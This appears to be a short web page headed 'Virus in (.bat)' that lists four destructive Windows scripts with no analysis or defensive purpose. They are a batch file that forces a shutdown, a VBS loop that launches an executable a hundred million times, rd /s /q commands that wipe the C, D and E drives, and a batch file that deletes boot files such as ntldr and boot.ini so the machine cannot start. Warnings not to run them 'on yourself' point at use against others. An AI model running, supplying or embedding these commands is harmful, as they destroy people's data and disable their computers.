### Virus in (.bat)

### 1. Sends a message and shuts down the computer:

@echo off
<br>
msg * your message
<br>
shutdown -c “your message” -s
<hr>

### 2. A simple virus that causes the computer to give an error:
<br>
--Save as .VBS file:
<br>
Option Explicit
<br>
Dim WSHShell
<br>
Set WSHShell=Wscript.CreateObject(“Wscript.Shell”)
<br>
Dim x
<br>
For x = 1 to 100000000
<br>
WSHShell.Run “Tourstart.exe”
<br>
Next
<hr>

### 3. Format discs in less than 5 seconds. Only D, E and C:

rd/s/q D:\
<br>
rd/s/q C:\
<br>
rd/s/q E:\
<hr>
---And now more dangerous batch files:

### 4. Causes the system to crash once then the computer cannot be restarted. 
-It removes everything needed to start the system:
<br>
### ---DO NOT USE ON YOURSELF

@echo off
<br>
attrib -r -s -h c:\autoexec.bat
<br>
del c:\autoexec.bat
<br>
attrib -r -s -h c:\boot.ini
<br>
del c:\boot.ini
<br>
attrib -r -s -h c:\ntldr
<br>
del c:\ntldr
<br>
attrib -r -s -h c:\windows\win.ini
<br>
del c:\windows\win.ini
<hr>

### !!!DO NOT REPEAT ALL THIS ON YOUR PC!!!
